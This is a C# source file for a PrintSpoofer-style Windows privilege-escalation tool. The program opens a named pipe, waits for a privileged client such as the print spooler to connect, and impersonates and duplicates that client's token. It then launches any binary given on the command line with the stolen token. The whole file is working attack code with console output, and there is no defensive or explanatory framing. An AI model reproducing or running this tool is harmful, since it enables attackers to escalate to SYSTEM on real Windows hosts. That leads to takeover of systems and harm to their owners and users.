using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;

namespace PrintSpooferNET
{
    public class Program
    {

        public static void Main(string[] args)
        {

            // Parse arguments (pipe name)
            if (args.Length != 2)
            {
                Console.WriteLine("[-]Please enter the pipe name to be used and the binary \nExample: "+AppDomain.CurrentDomain.FriendlyName + @" \\.\pipe\test\pipe\spoolss c:\windows\tasks\bin.exe");
                return;
            }
            string pipeName = args[0];
            string binToRun = args[1];

            // Create our named pipe
            Console.WriteLine("[+]CreateNamedPipe");
            IntPtr hPipe = Win32API.CreateNamedPipe(pipeName, (uint)PIPE_Token.PIPE_ACCESS_DUPLEX, (uint)PIPE_Token.PIPE_TYPE_BYTE | (uint)PIPE_Token.PIPE_WAIT, 10, 0x1000, 0x1000, 0, IntPtr.Zero);

            // Connect to our named pipe and wait for another client to connect
            Console.WriteLine("[+]Waiting for client to connect to named pipe...");
            bool result = Win32API.ConnectNamedPipe(hPipe, IntPtr.Zero);

            // Impersonate the token of the incoming connection
            result = Win32API.ImpersonateNamedPipeClient(hPipe);
            Console.WriteLine("[+]ImpersonateNamedPipeClient");

            // Open a handle on the impersonated token
            IntPtr tokenHandle;
            result = Win32API.OpenThreadToken(Win32API.GetCurrentThread(), (uint)PIPE_Token.TOKEN_ALL_ACCESS, false, out tokenHandle);
            Console.WriteLine("[+]OpenThreadToken");

            int TokenInfLength = 0;

            Win32API.GetTokenInformation(tokenHandle, 1, IntPtr.Zero, TokenInfLength, out TokenInfLength);
            IntPtr TokenInformation = Marshal.AllocHGlobal((IntPtr)TokenInfLength);
            Win32API.GetTokenInformation(tokenHandle, 1, TokenInformation, TokenInfLength, out TokenInfLength);
            StructLayout.TOKEN_USER TokenUser = (StructLayout.TOKEN_USER)Marshal.PtrToStructure(TokenInformation, typeof(StructLayout.TOKEN_USER));
            IntPtr pstr = IntPtr.Zero;
            Boolean ok = Win32API.ConvertSidToStringSid(TokenUser.User.Sid, out pstr);
            string sidstr = Marshal.PtrToStringAuto(pstr);
            Console.WriteLine(@"[+]Found sid {0}", sidstr);

            // Duplicate the stolen token
            IntPtr sysToken = IntPtr.Zero;
            Win32API.DuplicateTokenEx(tokenHandle, (uint)PIPE_Token.TOKEN_ALL_ACCESS, IntPtr.Zero, (uint)PIPE_Token.SECURITY_IMPERSONATION, (uint)PIPE_Token.TOKEN_PRIMARY, out sysToken);
            Console.WriteLine("[+]DuplicateToken");
            // Create an environment block for the non-interactive session
            IntPtr env = IntPtr.Zero;
            bool res = Win32API.CreateEnvironmentBlock(out env, sysToken, false);

            // Get the impersonated identity and revert to self to ensure we have impersonation privs
            String name = WindowsIdentity.GetCurrent().Name;
            Console.WriteLine($"[+]Impersonated user is: {name}.");
            Win32API.RevertToSelf();

            // Get the system directory
            StringBuilder sbSystemDir = new StringBuilder(256);
            uint res1 = Win32API.GetSystemDirectory(sbSystemDir, 256);

            // Spawn a new process with the duplicated token, a desktop session, and the created profile
            StructLayout.PROCESS_INFORMATION pInfo = new StructLayout.PROCESS_INFORMATION();
            StructLayout.STARTUPINFO sInfo = new StructLayout.STARTUPINFO();
            sInfo.cb = Marshal.SizeOf(sInfo);
            sInfo.lpDesktop = "WinSta0\\Default";
            Win32API.CreateProcessWithTokenW(sysToken, LogonFlags.WithProfile, null, binToRun, CreationFlags.UnicodeEnvironment, env, sbSystemDir.ToString(), ref sInfo, out pInfo);
            Console.WriteLine($"[+]Executed '{binToRun}' with impersonated token!");

        }
    }
}